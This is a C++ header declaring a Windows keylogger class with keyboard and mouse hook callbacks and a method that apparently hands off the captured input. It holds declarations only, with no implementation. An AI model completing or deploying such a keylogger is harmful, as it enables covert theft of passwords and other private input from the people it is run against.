#ifndef _KEYLOGGER_HH_
# define _KEYLOGGER_HH_

# include <iostream>
# include <sstream> 
# include <fstream>
# include <string>
# include <queue>
# include <boost/thread/mutex.hpp>
# include <Windows.h>

class				Keylogger
{
public:
	Keylogger();
	~Keylogger();

	bool			init();
	std::string*	sendTrame();
	static __declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp);
	static __declspec(dllexport) LRESULT CALLBACK handlemouse(int code, WPARAM wp, LPARAM lp);

private:
	HINSTANCE		_moduleHandle;
	HHOOK			_keyHook;
	std::string		_data;
};

#endif /* _KEYLOGGER_HH_ */